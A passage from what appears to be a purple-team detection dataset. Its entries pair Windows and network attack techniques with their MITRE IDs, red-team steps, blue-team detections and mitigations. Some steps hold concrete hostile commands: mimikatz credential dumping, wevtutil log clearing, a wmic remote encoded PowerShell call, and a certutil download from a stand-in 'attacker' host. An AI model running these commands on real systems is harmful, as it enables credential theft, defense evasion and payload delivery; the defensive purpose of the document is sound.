- **Attack Steps**: 1. Monitor SMTP traffic flow from internal hosts to external mail servers. 2. Identify hosts sending high volumes or unusual patterns of SMTP traffic. 3. Correlate with mail server logs for message content and recipient anomalies. 4. Alert on possible mass mailings or data leakage attempts. 5. Block or quarantine suspicious mail-sending hosts. 6. Investigate for malware infections or insider threats. 7. Implement mail flow rules and rate limits. 8. Train users to recognize phishing campaigns.
- **Detection**: Flow volume + correlation
- **Solution**: Mail server rules + endpoint monitoring
- **Tags**: #smtp #dataexfil #netflow

## Identify Anomalous VPN Flow Traffic

- **Attack Type**: Evasion
- **Target**: Endpoint Network
- **Vulnerability**: Traffic obfuscation
- **MITRE**: T1027 (Obfuscated Files or Information)
- **Impact**: Detection evasion
- **Tools**: NetFlow, SIEM, VPN Logs
- **Scenario**: Attackers use VPNs to mask malicious activity and evade detection
- **Attack Steps**: 1. Aggregate flow data for known VPN endpoints and ports. 2. Identify hosts generating traffic through unauthorized or unusual VPN services. 3. Detect abnormal volume or timing patterns inconsistent with user behavior. 4. Correlate VPN session logs with user authentication events. 5. Alert SOC on suspicious VPN usage. 6. Block unauthorized VPN traffic and notify users. 7. Enforce endpoint VPN client policies. 8. Monitor network for covert tunnels over VPN.
- **Detection**: VPN session correlation + flow analysis
- **Solution**: Access control + endpoint compliance
- **Tags**: #vpn #evasion #netflowanalysis

## Detect Abnormal SMB Traffic Volume

- **Attack Type**: Lateral Movement
- **Target**: Internal Network
- **Vulnerability**: SMB abuse
- **MITRE**: T1021.002 (SMB/Windows Admin Shares)
- **Impact**: Lateral movement and data theft
- **Tools**: NetFlow, SIEM, Endpoint Logs
- **Scenario**: Attackers use SMB for lateral movement and data access
- **Attack Steps**: 1. Monitor flow data for SMB (port 445) sessions. 2. Detect hosts generating unusually high SMB traffic volumes. 3. Correlate with endpoint logs for user and process legitimacy. 4. Alert on unexpected SMB usage or transfers. 5. Block or quarantine suspicious hosts. 6. Implement SMB signing and access controls. 7. Audit SMB permissions regularly. 8. Conduct forensic analysis on flagged hosts.
- **Detection**: Flow volume + endpoint correlation
- **Solution**: Access control + logging and auditing
- **Tags**: #smb #lateralmovement #netflow

## Spot High Volume ICMP Flows Indicative of Scanning

- **Attack Type**: Reconnaissance
- **Target**: Network Perimeter
- **Vulnerability**: Protocol misuse
- **MITRE**: T1595.001 (Active Scanning)
- **Impact**: Network reconnaissance
- **Tools**: NetFlow, SIEM, IDS
- **Scenario**: Attackers use ICMP scanning to map network
- **Attack Steps**: 1. Filter flow data for ICMP packets, focusing on echo requests. 2. Identify hosts sending bursts of ICMP packets to multiple destinations. 3. Detect scanning behavior patterns by timing and destination distribution. 4. Alert SOC on suspicious ICMP scanning activity. 5. Block or rate-limit ICMP traffic from suspicious sources. 6. Correlate with IDS alerts and endpoint logs. 7. Investigate potential host compromise. 8. Tune detection systems to reduce false positives.
- **Detection**: Flow analysis + IDS correlation
- **Solution**: Rate limiting + host quarantine
- **Tags**: #icmp #recon #netflowanalysis

## Detect Suspicious Use of NetBIOS Traffic

- **Attack Type**: Lateral Movement
- **Target**: Internal Network
- **Vulnerability**: Protocol misuse
- **MITRE**: T1021.002 (SMB/Windows Admin Shares)
- **Impact**: Lateral movement
- **Tools**: NetFlow, SIEM, Endpoint Logs
- **Scenario**: Adversaries use NetBIOS traffic to discover and move within network
- **Attack Steps**: 1. Monitor flow records for NetBIOS protocols (ports 137-139). 2. Identify hosts generating high volumes of NetBIOS traffic. 3. Detect unusual NetBIOS sessions or broadcasts inconsistent with baseline. 4. Alert on lateral movement attempts using NetBIOS. 5. Restrict NetBIOS traffic where unnecessary. 6. Investigate endpoint activity and credentials. 7. Harden network segmentation and access control. 8. Educate admins on minimizing NetBIOS exposure.
- **Detection**: Flow volume + behavior analysis
- **Solution**: Network hardening + endpoint monitoring
- **Tags**: #netbios #lateralmovement #netflow

## Identify Use of Covert Channels via Flow Timing

- **Attack Type**: Data Exfiltration
- **Target**: Internal Network
- **Vulnerability**: Timing channel
- **MITRE**: T1027 (Obfuscated Files or Information)
- **Impact**: Data leakage
- **Tools**: NetFlow, Zeek, SIEM
- **Scenario**: Attackers use precise timing of flows to encode data and evade detection
- **Attack Steps**: 1. Collect flow metadata including timestamp and duration. 2. Apply timing analysis and statistical methods to detect patterns inconsistent with normal traffic. 3. Detect repeated bursts or inter-arrival timing modulations indicative of covert channels. 4. Correlate findings with endpoint alerts and network context. 5. Alert SOC of suspected covert communication. 6. Block affected hosts and conduct forensic analysis. 7. Implement stricter flow monitoring and anomaly detection. 8. Update detection signatures and educate analysts on timing-based exfiltration.
- **Detection**: Timing pattern analysis
- **Solution**: Host isolation + flow monitoring
- **Tags**: #covertchannel #timinganomaly #netflow

## Credential Dumping Detection via LSASS

- **Attack Type**: Credential Access Simulation
- **Target**: Windows Endpoint
- **Vulnerability**: LSASS memory exposure
- **MITRE**: T1003.001
- **Impact**: Privilege escalation and lateral movement
- **Tools**: Mimikatz, Sysmon
- **Scenario**: Simulate LSASS memory scraping to validate Blue Team’s credential dumping alerts
- **Attack Steps**: 1. Red Team launches mimikatz.exe on a Windows 10 endpoint2. Dumps lsass.exe process memory using the sekurlsa::logonpasswords command3. Blue Team uses Sysmon and Windows Event Logs to detect access to LSASS4. Alerts are triggered via SIEM rules that monitor for handle access events to LSASS5. Purple Team maps the detection with MITRE and notes the gaps
- **Detection**: Sysmon Event ID 10 (process access), SIEM alert rules
- **Solution**: Restrict LSASS access using Credential Guard; implement alerting for process access anomalies
- **Tags**: #purpleteaming #credentialdumping #lsass

## PowerShell Empire Post-Ex Simulation

- **Attack Type**: Post-Exploitation with Obfuscated Scripts
- **Target**: Windows Server
- **Vulnerability**: Script obfuscation
- **MITRE**: T1059.001
- **Impact**: Stealthy privilege escalation
- **Tools**: PowerShell Empire, Windows Defender, Splunk
- **Scenario**: Test detection of obfuscated PowerShell post-exploitation scripts
- **Attack Steps**: 1. Red Team establishes foothold using Empire agent on victim host2. Executes obfuscated PowerShell one-liners for privilege escalation3. Blue Team reviews logs for encoded commands using AMSI and Event ID 41044. Detection rules in SIEM are evaluated and refined to catch Base64 encoded payloads5. Purple Team documents blind spots in alerting
- **Detection**: Event ID 4104 (script block logging), Defender AMSI logs
- **Solution**: Enable PowerShell logging; AMSI integration with EDRs
- **Tags**: #powershell #empire #obfuscation

## DNS Tunneling for Exfil Detection

- **Attack Type**: C2 and Exfiltration via DNS
- **Target**: Corporate Workstation
- **Vulnerability**: Misused DNS Protocol
- **MITRE**: T1071.004
- **Impact**: Data exfiltration, C2 communication
- **Tools**: Iodine, Wireshark, Zeek, Splunk
- **Scenario**: Simulate DNS tunneling to test detection of abnormal outbound DNS queries
- **Attack Steps**: 1. Red Team sets up an iodine DNS tunnel to a controlled domain2. Starts transferring files covertly via DNS TXT records3. Blue Team monitors Zeek logs and passive DNS traffic4. Detects anomalies like high DNS query frequency and payload size5. Purple Team evaluates thresholds and improves alert logic in SIEM
- **Detection**: Zeek DNS logs, anomaly detection on DNS query size and timing
- **Solution**: Block non-standard DNS traffic; use DNS tunneling detection tools
- **Tags**: #dnstunneling #exfiltration #zeek

## Cobalt Strike Beacon Detection Coverage

- **Attack Type**: Beaconing Simulation
- **Target**: Windows Host
- **Vulnerability**: Lack of behavioral anomaly detection
- **MITRE**: T1071.001
- **Impact**: Persistent access through beaconing
- **Tools**: Cobalt Strike, ELK Stack, Sysmon
- **Scenario**: Emulate Cobalt Strike beaconing and test how well beacon behaviors are detected
- **Attack Steps**: 1. Red Team launches Cobalt Strike with a 30-second beacon interval2. Beacon attempts outbound HTTP communications with jitter3. Blue Team monitors network traffic for repeated periodic HTTP connections4. SIEM alerts on periodic connections, suspicious user-agents5. Purple Team tunes rules to reduce false positives and improve coverage
- **Detection**: Network anomaly detection, Suricata alerts, SIEM behavior rules
- **Solution**: Use C2 detection signatures and detect regular interval HTTP/S traffic
- **Tags**: #cobaltstrike #beaconing #purpleteam

## Malicious Office Macro Execution Detection

- **Attack Type**: Initial Access via Weaponized Documents
- **Target**: Employee Workstation
- **Vulnerability**: Enabled macros
- **MITRE**: T1203
- **Impact**: Remote code execution via Office
- **Tools**: MS Office, VBA Stager, Windows Event Logs
- **Scenario**: Assess if Blue Team detects malicious macro execution in Office files
- **Attack Steps**: 1. Red Team sends an email with macro-enabled .docm file2. Victim enables macros and executes VBA payload that spawns PowerShell3. Blue Team uses Event ID 1 (process creation) and macro execution logging to correlate4. Detects anomalous parent-child process relationship (WINWORD -> PowerShell)5. Purple Team recommends adding parent-child rules to EDR
- **Detection**: EDR parent-child process analysis, Sysmon, Defender logs
- **Solution**: Disable macros by default, use sandbox detonation
- **Tags**: #macros #initialaccess #documentattack

## Lateral Movement Detection using PsExec

- **Attack Type**: Lateral Movement via Admin Shares
- **Target**: Windows Domain
- **Vulnerability**: Misuse of admin credentials
- **MITRE**: T1021.002
- **Impact**: Internal spread of threat actor
- **Tools**: PsExec, Sysmon, ELK, Windows Logs
- **Scenario**: Simulate PsExec use to test how well lateral movements are logged and detected
- **Attack Steps**: 1. Red Team uses PsExec to execute cmd.exe on another host2. Uses valid admin credentials and service control manager3. Blue Team tracks Event ID 7045 (new service installed), 4688 (process creation)4. SIEM rules catch PsExec artifacts like PSEXESVC.exe installation5. Purple Team enhances correlation logic for service-based movement
- **Detection**: Sysmon, Event Log 7045, service creation events
- **Solution**: Monitor service installs, block PsExec via GPO
- **Tags**: #psexec #lateralmovement #sysmon

## Scheduled Task for Persistence Detection

- **Attack Type**: Persistence via Task Scheduler
- **Target**: Windows Host
- **Vulnerability**: Scheduled tasks abuse
- **MITRE**: T1053.005
- **Impact**: Long-term persistence mechanism
- **Tools**: schtasks, Sysinternals, Event Viewer
- **Scenario**: Test if Blue Team detects malicious scheduled tasks created for persistence
- **Attack Steps**: 1. Red Team creates a scheduled task named WindowsUpdateCheck with hidden PowerShell2. Sets it to run every 10 minutes3. Blue Team detects unusual task registration in Event ID 1064. Uses autoruns and taskschd.msc for visibility5. Purple Team refines detection for suspicious task names and commands
- **Detection**: Event ID 106 (task creation), periodic execution alerts
- **Solution**: Audit scheduled task creation and block unknown executables
- **Tags**: #persistence #taskcreation #autoruns

## Web Shell Deployment & Detection

- **Attack Type**: Post-Exploitation Web Shell Access
- **Target**: Web Server
- **Vulnerability**: File upload to web root
- **MITRE**: T1505.003
- **Impact**: Backdoor on web server
- **Tools**: ASPX Shell, IIS, Splunk, Suricata
- **Scenario**: Evaluate how quickly Blue Team identifies web shell placement and activity
- **Attack Steps**: 1. Red Team uploads a reverse shell (aspx) into IIS directory2. Triggers shell via browser and receives callback3. Blue Team detects unusual IIS GET/POST traffic patterns4. Uses Suricata to flag suspicious user-agent and POST behavior5. Purple Team confirms missing detections for outbound callbacks
- **Detection**: Suricata, IIS logs, AV web shell signatures
- **Solution**: Restrict web root access, AV + WAF signatures
- **Tags**: #webshell #iis #reverseproxy

## Log Clearing Behavior Detection

- **Attack Type**: Defense Evasion Log Deletion
- **Target**: Windows Endpoint
- **Vulnerability**: Lack of audit trail
- **MITRE**: T1070.001
- **Impact**: Forensic disruption and stealth
- **Tools**: wevtutil, Windows Logs
- **Scenario**: Simulate attacker clearing logs to evade detection, test alert coverage
- **Attack Steps**: 1. Red Team uses wevtutil cl Security to clear Security logs2. Blue Team monitors for Event ID 1102 (audit log cleared)3. SIEM generates high-severity alert on log wipe4. Purple Team evaluates correlation with user behavior and context5. Playbook is updated for immediate triage of such events
- **Detection**: Event ID 1102, SIEM alerting
- **Solution**: Lock down wevtutil, restrict admin access
- **Tags**: #logclearing #audittrail #evasion

## Brute Force Login & Lockout Detection

- **Attack Type**: Credential Stuffing Simulation
- **Target**: Active Directory
- **Vulnerability**: Weak passwords, no MFA
- **MITRE**: T1110
- **Impact**: Account compromise, DoS
- **Tools**: Hydra, AD logs, SIEM
- **Scenario**: Simulate brute force login attempts and test lockout & alerting rules
- **Attack Steps**: 1. Red Team targets Active Directory with username/password spray2. Triggers multiple failed login attempts using Hydra3. Blue Team detects Event ID 4625 (failed logins), lockouts via 47404. SIEM rules correlate patterns across multiple users and IPs5. Purple Team adjusts thresholds and tunes false-positive filters
- **Detection**: Login failure analysis, lockout monitoring
- **Solution**: MFA, smart account lockout policies
- **Tags**: #bruteforce #adsecurity #accountlockout

## LSASS Dumping Detection via Mimikatz

- **Attack Type**: Credential Dumping
- **Target**: Windows Endpoint
- **Vulnerability**: Unprotected LSASS access
- **MITRE**: T1003.001
- **Impact**: Credential theft, lateral movement
- **Tools**: Mimikatz, Sysmon, Windows Event Logs, ELK
- **Scenario**: Simulate credential theft from memory to assess log detection fidelity
- **Attack Steps**: 1. Red Team compromises a standard user account via spear phishing.2. Escalates privileges using a known vulnerability to local admin.3. Executes mimikatz.exe on the target system.4. Runs privilege::debug to gain necessary access, then executes sekurlsa::logonpasswords.5. Dumps credentials from LSASS, storing them in a local temp file.6. Blue Team uses Sysmon with Event ID 10 to monitor suspicious handle requests to LSASS.7. SIEM (like Splunk) correlates process access patterns between mimikatz.exe and LSASS.8. Purple Team evaluates whether alerts were triggered, if logs were collected properly, and if detection logic missed variants.
- **Detection**: Sysmon EID 10, Defender, EDR logs, alert on LSASS access
- **Solution**: Enable Credential Guard, block LSASS access from non-PPL processes
- **Tags**: #mimikatz #lsass #purpleteam

## Encoded PowerShell Attack Detection

- **Attack Type**: Obfuscated Scripting
- **Target**: Windows Workstation
- **Vulnerability**: PowerShell misuse
- **MITRE**: T1059.001
- **Impact**: Remote access via stealthy script
- **Tools**: PowerShell, Empire, Event Logs, Splunk
- **Scenario**: Emulate obfuscated PowerShell usage to test AMSI and script block logging
- **Attack Steps**: 1. Red Team encodes a PowerShell reverse shell using Base64.2. Crafts a command like powershell -EncodedCommand <payload>.3. Executes it via a phishing document or malicious shortcut.4. AMSI inspects the decoded content and logs it.5. Blue Team reviews Event ID 4104 (script block) and AMSI logs.6. Uses keyword-based detection and logic-based alerts for suspicious decoded content.7. SIEM correlates encoded scripts with suspicious process ancestry like WINWORD.exe -> powershell.exe.8. Purple Team validates detection latency, false positives, and recommends tuning thresholds.
- **Detection**: AMSI logs, Event ID 4104, Defender ATP
- **Solution**: Enable deep script logging, integrate AMSI with EDR
- **Tags**: #powershell #amsi #obfuscation

## Cobalt Strike Beacon Timing Analysis

- **Attack Type**: C2 Detection
- **Target**: Internal Hosts
- **Vulnerability**: No entropy check on outbound traffic
- **MITRE**: T1071.001
- **Impact**: Covert command channel
- **Tools**: Cobalt Strike, Wireshark, ELK
- **Scenario**: Detect periodic beaconing traffic to known malicious C2 servers
- **Attack Steps**: 1. Red Team launches a Cobalt Strike beacon with 60s interval and jitter.2. Beacon traffic mimics normal HTTP GET requests to a compromised domain.3. Blue Team monitors proxy logs and NetFlow to observe regular intervals.4. Applies analytics to detect traffic with consistent timing or low entropy.5. Uses Suricata to flag suspicious user agents and request patterns.6. Correlates DNS requests for beacon domain with outbound HTTP.7. Purple Team evaluates network coverage and improves regex-based rules.
- **Detection**: Network anomaly detection, Suricata, Bro/Zeek
- **Solution**: Behavior-based C2 signatures, beacon interval detectors
- **Tags**: #cobaltstrike #c2 #beacon

## Malicious Word Macro Execution

- **Attack Type**: Initial Access via Macros
- **Target**: Employee Workstation
- **Vulnerability**: Macros enabled by user
- **MITRE**: T1203
- **Impact**: Code execution & backdoor
- **Tools**: MS Word, VBA, Sysmon, Defender
- **Scenario**: Evaluate detection of VBA macro payloads embedded in Office files
- **Attack Steps**: 1. Red Team builds a .docm file containing a macro that spawns PowerShell.2. Sends it to a target via email with social engineering lure.3. Victim enables macros; macro runs and drops a backdoor.4. Blue Team uses Sysmon Event ID 1 to detect unusual child processes.5. Alerts on WINWORD.exe spawning powershell.exe.6. Defender’s Antimalware Scan Interface (AMSI) captures script payload.7. Purple Team analyzes detection blind spots and adjusts rules for macro execution alerts.
- **Detection**: Sysmon EID 1, AMSI scan logs, macro trigger alerts
- **Solution**: Disable macros, sandbox macro-enabled docs
- **Tags**: #macros #vba #initialaccess

## DNS Tunneling with Iodine

- **Attack Type**: Covert Exfiltration
- **Target**: Windows Host
- **Vulnerability**: Open DNS egress
- **MITRE**: T1071.004
- **Impact**: Stealthy data exfiltration
- **Tools**: Iodine, Wireshark, Zeek
- **Scenario**: Simulate DNS tunneling to exfiltrate files
- **Attack Steps**: 1. Red Team sets up an Iodine server externally.2. Installs Iodine client on compromised workstation.3. Sends data exfil through DNS TXT records via attacker-controlled domain.4. Blue Team uses Zeek and Suricata to analyze DNS payload length, record types, and frequency.5. Flags domains with high entropy or repeated patterns.6. Purple Team maps effective thresholds and detection latency.
- **Detection**: DNS log analysis (Zeek), entropy thresholding
- **Solution**: Block TXT/NULL DNS egress; alert on tunneling patterns
- **Tags**: #dns #iodine #tunneling

## PsExec Lateral Movement

- **Attack Type**: Admin Share Exploitation
- **Target**: Internal Servers
- **Vulnerability**: No SMB segmentation
- **MITRE**: T1021.002
- **Impact**: Privileged code execution remotely
- **Tools**: PsExec, Sysmon, Windows Logs
- **Scenario**: Simulate PsExec-based movement across endpoints
- **Attack Steps**: 1. Red Team gains admin credentials.2. Executes PsExec.exe \\victim cmd.exe from a jump box.3. Victim system logs service creation (EID 7045) and process creation (EID 4688).4. Blue Team detects the presence of PSEXESVC.exe and correlates new service logs.5. Correlates inbound SMB traffic followed by suspicious service behavior.6. Purple Team evaluates if lateral movement alert was timely.
- **Detection**: Event ID 7045, SMB logs, EDR logs
- **Solution**: Disable SMB lateral tools; enforce segmentation
- **Tags**: #psexec #lateral #servicecreation

## Scheduled Task for Persistence

- **Attack Type**: Persistence Mechanism
- **Target**: Windows Machine
- **Vulnerability**: Task creation allowed
- **MITRE**: T1053.005
- **Impact**: Automatic reexecution of malware
- **Tools**: schtasks, Sysinternals, Event Logs
- **Scenario**: Use scheduled task to auto-relaunch payload silently
- **Attack Steps**: 1. Red Team creates a hidden task via schtasks /create with a malicious script.2. Task named WindowsUpdateTask set to trigger at login.3. Payload is stored under a hidden folder in %AppData%.4. Blue Team detects task creation via Event ID 106.5. Uses autoruns, Task Scheduler logs, and Sysmon to trace process tree.6. Purple Team validates task naming convention detection and command-line alerting.
- **Detection**: Task logs, Sysmon, EDR detection
- **Solution**: Block unknown scheduled tasks, alert on command lines
- **Tags**: #scheduledtasks #persistence #schtasks

## Web Shell via File Upload

- **Attack Type**: Post-Exploitation
- **Target**: Web Server
- **Vulnerability**: Insecure file upload
- **MITRE**: T1505.003
- **Impact**: Web backdoor & persistence
- **Tools**: Burp Suite, ASPX Web Shell, IIS, Suricata
- **Scenario**: Deploy web shell on server to validate WAF/EDR alerts
- **Attack Steps**: 1. Red Team uploads a .aspx shell using vulnerable upload form.2. Accesses shell via browser, executes OS commands.3. Blue Team detects anomaly in POST requests and unusual user agents.4. Correlates unexpected command execution on web server.5. Purple Team analyzes response time and signature coverage in WAF.
- **Detection**: WAF rules, IIS logs, Suricata alerts
- **Solution**: Harden uploads, detect ASPX shell patterns
- **Tags**: #webshell #aspx #fileupload

## Event Log Deletion

- **Attack Type**: Log Tampering
- **Target**: Windows Host
- **Vulnerability**: Unrestricted log access
- **MITRE**: T1070.001
- **Impact**: Hides attacker footprint
- **Tools**: Wevtutil, EDR, Sysmon
- **Scenario**: Simulate attacker clearing security logs to erase traces
- **Attack Steps**: 1. Red Team uses wevtutil cl Security to clear event logs.2. Executes using a privileged command shell.3. Blue Team detects Event ID 1102 (audit log cleared).4. Correlates timing with earlier suspicious activity.5. Purple Team evaluates playbook for incident triage when logs disappear.
- **Detection**: Event ID 1102, anomaly detection on empty logs
- **Solution**: Alert on log clearing, restrict log tools to admins
- **Tags**: #logclearing #audit #defenseevasion

## Account Lockout through Brute Force

- **Attack Type**: Credential Attack
- **Target**: Domain Controller
- **Vulnerability**: Weak passwords, no MFA
- **MITRE**: T1110.003
- **Impact**: Account DoS, credential theft
- **Tools**: Hydra, AD, SIEM
- **Scenario**: Emulate password spraying to test AD lockout and detection logic
- **Attack Steps**: 1. Red Team targets multiple AD accounts using a password spray attack.2. Hydra or custom scripts attempt login using common passwords.3. Blue Team detects Event ID 4625 (failed login) and 4740 (account lockout).4. Correlates multiple failed attempts from single IP across multiple accounts.5. Purple Team adjusts detection thresholds and evaluates SIEM response time.
- **Detection**: SIEM log correlation, lockout alerts
- **Solution**: Enforce MFA, adaptive lockout rules
- **Tags**: #bruteforce #ad #lockout

## Kerberoasting Simulation to Test Ticket Detection

- **Attack Type**: Credential Access (TGS Extraction)
- **Target**: Domain Controller
- **Vulnerability**: Exposed SPNs & TGS requests
- **MITRE**: T1558.003
- **Impact**: Lateral movement prep, privilege escalation
- **Tools**: Rubeus, Mimikatz, AD Explorer, Event Logs
- **Scenario**: Simulate Kerberoasting attack and assess if ticket requests and hash extraction are properly detected
- **Attack Steps**: 1. Red Team gains a standard domain user account through phishing or password spraying.2. They perform domain reconnaissance using nltest /dclist and setspn -T to enumerate service principal names (SPNs) in the domain.3. They then use Rubeus.exe kerberoast to request service tickets (TGS) for these SPNs.4. The TGS tickets are dumped and extracted in hashed format from memory.5. Hashes are then cracked offline using Hashcat to retrieve service account passwords.6. Blue Team enables detailed Kerberos logging and monitors for excessive TGS requests (Event ID 4769) from non-privileged accounts.7. SIEM correlation rules are checked to detect when multiple unique SPNs are being requested from a single user/IP within a short time frame.8. Purple Team verifies whether hash dumping, TGS enumeration, and correlation rules worked effectively or were bypassed.
- **Detection**: Event ID 4769, correlation of SPN requests
- **Solution**: Alert on TGS spikes, use service account honeytokens
- **Tags**: #kerberoasting #tgs #credentialaccess

## Remote Desktop Protocol Abuse Detection

- **Attack Type**: Lateral Movement via RDP
- **Target**: Internal Server / Workstation
- **Vulnerability**: Unrestricted RDP from lateral IPs
- **MITRE**: T1021.001
- **Impact**: Unauthorized access, lateral pivoting
- **Tools**: RDP, Sysmon, Network Logs, MSTSC
- **Scenario**: Simulate unauthorized RDP access using stolen credentials to evaluate detection depth
- **Attack Steps**: 1. Red Team obtains credentials of a domain user via phishing and password reuse.2. From an attacker-controlled host within the network, they initiate RDP connections using MSTSC or cmdkey /add to store credentials.3. They connect to target workstations or servers using mstsc.exe.4. Blue Team monitors Event ID 4624 (Logon), particularly Type 10 for RDP logins.5. They correlate RDP logins with abnormal times, unknown IPs, or suspicious accounts.6. Network logs are used to trace RDP port 3389 traffic outside known admin zones.7. Purple Team evaluates if unauthorized logins via RDP were flagged, especially if multiple hops were made in succession.8. Gaps in behavioral rules or alerts on low-privileged accounts using RDP are documented.
- **Detection**: Logon Event ID 4624 (Type 10), Firewall Logs
- **Solution**: Geo-fencing RDP access, behavior-based detection
- **Tags**: #rdp #lateralmovement #mstsc

## WMI Remote Command Execution Detection

- **Attack Type**: Remote Execution via WMI
- **Target**: Windows Server
- **Vulnerability**: Misuse of WMI for stealth execution
- **MITRE**: T1047
- **Impact**: Covert remote command execution
- **Tools**: WMI, PowerShell, Sysmon, Event Logs
- **Scenario**: Use WMI commands to run remote PowerShell payloads and test how they're logged
- **Attack Steps**: 1. Red Team uses compromised domain credentials to access a remote system.2. Executes wmic /node:"target" process call create "powershell.exe -EncodedCommand <payload>".3. Alternatively, uses PowerShell’s Invoke-WmiMethod to call remote process creation.4. On the target, this spawns PowerShell with no direct logon session, often missed by default logs.5. Blue Team monitors Sysmon Event ID 1 (Process Creation), particularly with no parent user session.6. Event ID 4688 also shows PowerShell launches with “wmiprvse.exe” as parent.7. SIEM correlates this behavior to detect WMI lateral movement.8. Purple Team evaluates gaps in alert logic for non-interactive session-based command executions.
- **Detection**: Sysmon EID 1, Event ID 4688, WMI logs
- **Solution**: Alert on WMI + PowerShell patterns, block remote WMI by policy
- **Tags**: #wmi #powershell #covertlateral

## Abuse of Windows Admin Shares

- **Attack Type**: Lateral Movement via SMB
- **Target**: Internal Windows Host
- **Vulnerability**: SMB access permissions
- **MITRE**: T1021.002
- **Impact**: Unauthorized execution from shares
- **Tools**: SMB, PsExec, Sysinternals, Wireshark
- **Scenario**: Simulate copying and executing payloads via C$, ADMIN$ shares
- **Attack Steps**: 1. Red Team uses SMB to connect to remote admin shares such as C$ and ADMIN$ using valid credentials.2. Copies a malicious payload (e.g., reverse shell) to a writable directory like C:\Windows\Temp.3. Executes it remotely via sc create or wmic.4. Blue Team monitors for unexpected share accesses and file writes from unusual accounts or machines.5. SMB logs and Sysmon track file drops and process launches from admin shares.6. Purple Team assesses whether alerts were generated and mapped accurately to lateral movement activity.7. Lateral access paths are graphed to ensure detection from origin to target system.
- **Detection**: SMB logs, Event ID 5140, Sysmon EID 1
- **Solution**: Restrict admin share usage, monitor lateral access maps
- **Tags**: #adminshares #smb #shareabuse

## Token Impersonation (Pass-the-Token) Simulation

- **Attack Type**: Privilege Escalation
- **Target**: Domain Endpoint
- **Vulnerability**: Token management misconfigurations
- **MITRE**: T1134.001
- **Impact**: Covert privilege escalation
- **Tools**: Mimikatz, Rubeus, Windows Token Viewer
- **Scenario**: Simulate the use of impersonated access tokens to escalate privileges
- **Attack Steps**: 1. Red Team dumps access tokens from a high-privilege session using mimikatz "token::elevate".2. Uses the token::use command to impersonate SYSTEM or high-privilege domain user.3. Runs payloads under impersonated token context, avoiding traditional logon traces.4. Blue Team detects anomalies like privilege mismatch between parent and child processes.5. Correlates EID 4624 (Logon Type 9 - impersonation) and EID 4648 (explicit credentials used).6. EDR solutions are tuned to flag context-switching without corresponding logons.7. Purple Team checks if impersonation behavior is visible in lateral or privilege escalation attempts.
- **Detection**: EDR context analysis, logon type correlation
- **Solution**: Limit impersonation privileges, block token theft tools
- **Tags**: #tokentheft #impersonation #escalation

## NTLM Relay Attack to Internal Services

- **Attack Type**: Authentication Relay
- **Target**: Internal Network
- **Vulnerability**: NTLM not disabled
- **MITRE**: T1557.001
- **Impact**: Unauthorized service access
- **Tools**: ntlmrelayx, Responder, SMB
- **Scenario**: Simulate NTLM relay to internal web or LDAP service
- **Attack Steps**: 1. Red Team runs Responder on subnet to poison LLMNR/NBT-NS.2. Captures authentication requests and uses ntlmrelayx to forward them to LDAP or SMB.3. Authenticates to internal service without knowing plaintext password.4. Creates new admin account if permissions allow.5. Blue Team detects Responder-like behavior with suspicious name resolution and SMB probes.6. Monitors for anomalous account creation or admin elevation logs (Event ID 4720, 4728).7. Purple Team ensures DNS hardening and alerting on SMB authentication patterns.
- **Detection**: DNS/NBNS logs, new user creation alerts
- **Solution**: Disable NTLM, enable SMB signing, use LLMNR defenses
- **Tags**: #ntlmrelay #responder #authbypass

## Living Off The Land with CertUtil

- **Attack Type**: File Download (LOLBins)
- **Target**: User Workstation
- **Vulnerability**: LOLBins allowed
- **MITRE**: T1105
- **Impact**: External payload delivery
- **Tools**: certutil.exe, Windows Defender
- **Scenario**: Test if downloading payloads using CertUtil is detected
- **Attack Steps**: 1. Red Team compromises a user system and uses certutil.exe -urlcache -f http://attacker/payload.exe payload.exe.2. CertUtil downloads the malicious binary from an external attacker server.3. Blue Team monitors for execution of CertUtil with unusual parameters.4. Sysmon logs command-line activity and file creation in non-browser downloads.5. Defender flags payload hash if known.6. Purple Team ensures SIEM rules cover LOLBin usage and not just typical download utilities.
- **Detection**: Sysmon EID 1, file hash detection, Defender alert
- **Solution**: Alert on LOLBin patterns, restrict external calls
- **Tags**: #certutil #livingofftheland #downloader

## Active Directory Enumeration using BloodHound

- **Attack Type**: Discovery
- **Target**: Domain Controller
- **Vulnerability**: Excessive LDAP enumeration
- **MITRE**: T1087, T1069
- **Impact**: Recon for privilege escalation planning
- **Tools**: BloodHound, SharpHound, Neo4j
- **Scenario**: Simulate internal AD recon with detection validation
- **Attack Steps**: 1. Red Team runs SharpHound on a compromised endpoint with domain access.2. Performs full scan of user sessions, ACLs, group memberships, and GPOs.3. Exfiltrates collected data to analyze in BloodHound GUI.4. Blue Team monitors for mass LDAP queries, file share access anomalies, and suspicious Kerberos activity.5. Detects high-frequency session enumeration and ACL harvesting.6. Purple Team evaluates logging depth from LDAP servers and coverage in SIEM.
- **Detection**: LDAP logs, Event ID 4662, network share monitors
- **Solution**: Throttle queries, detect SharpHound signatures
- **Tags**: #bloodhound #discovery #ldap

## Clearing Windows Defender Logs

- **Attack Type**: Defense Evasion
- **Target**: Defender-enabled Host
- **Vulnerability**: Insufficient logging tamper detection
- **MITRE**: T1070.006
- **Impact**: Disables security monitoring
- **Tools**: PowerShell, Event Viewer, Windows API
- **Scenario**: Simulate erasure of security telemetry to test coverage gaps
- **Attack Steps**: 1. Red Team executes PowerShell: Remove-MpThreat -All and clears Defender history.2. Accesses Windows Event Viewer programmatically and clears key event channels like Security, Microsoft-Windows-Windows Defender/Operational.3. Deletes telemetry files in hidden Defender folders.4. Blue Team monitors for abrupt log dropouts, uses Event ID 1102 and EID 104 (service stop).5. EDR agents track abnormal PowerShell module loads related to Defender modules.6. Purple Team validates log retention policies, SIEM alerting on sudden telemetry disappearance.
- **Detection**: Defender logs, Event Viewer triggers
- **Solution**: Harden Defender, monitor PowerShell module use
- **Tags**: #defender #logtampering #evasion

## Email Exfiltration via OAuth Abuse

- **Attack Type**: Cloud Data Exfiltration
- **Target**: O365 Account
- **Vulnerability**: No control over app consents
- **MITRE**: T1539
- **Impact**: Email/PII data breach
- **Tools**: o365, Evilginx, Azure Portal
- **Scenario**: Test if abuse of authorized third-party apps for email exfil is detected
- **Attack Steps**: 1. Red Team compromises user account and grants OAuth access via malicious app.2. App is authorized to read emails and contacts via OAuth tokens, bypassing login alerts.3. Data is accessed via APIs from attacker-controlled app.4. Blue Team reviews Azure AD logs for “Consent to application” and non-interactive sign-ins.5. Uses MCAS and Defender for Cloud Apps to correlate OAuth-based access.6. Purple Team evaluates gaps in API access monitoring and user consent alerts.
- **Detection**: OAuth token audit logs, MCAS, Azure AD
